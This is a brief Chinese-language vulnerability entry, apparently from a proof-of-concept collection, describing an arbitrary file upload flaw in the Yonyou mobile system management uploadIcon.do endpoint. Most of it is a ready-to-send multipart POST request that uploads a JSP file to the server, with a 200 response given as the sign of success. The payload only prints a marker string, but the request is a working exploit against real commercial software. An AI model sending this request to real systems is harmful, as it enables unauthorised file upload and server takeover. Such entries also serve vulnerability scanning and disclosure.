# 用友移动系统管理uploadIcon.do接口任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **请求**：`POST /maportal/appmanager/uploadIcon.do HTTP/1.1`

**Payload**
```
--b4e8eb7e0392a9158c610b1875784406
Content-Disposition: form-data; name="iconFile"; filename="dudesuite.jsp"
<% out.println("dudesuite"); %>
--b4e8eb7e0392a9158c610b1875784406--
```
- **响应特征**：200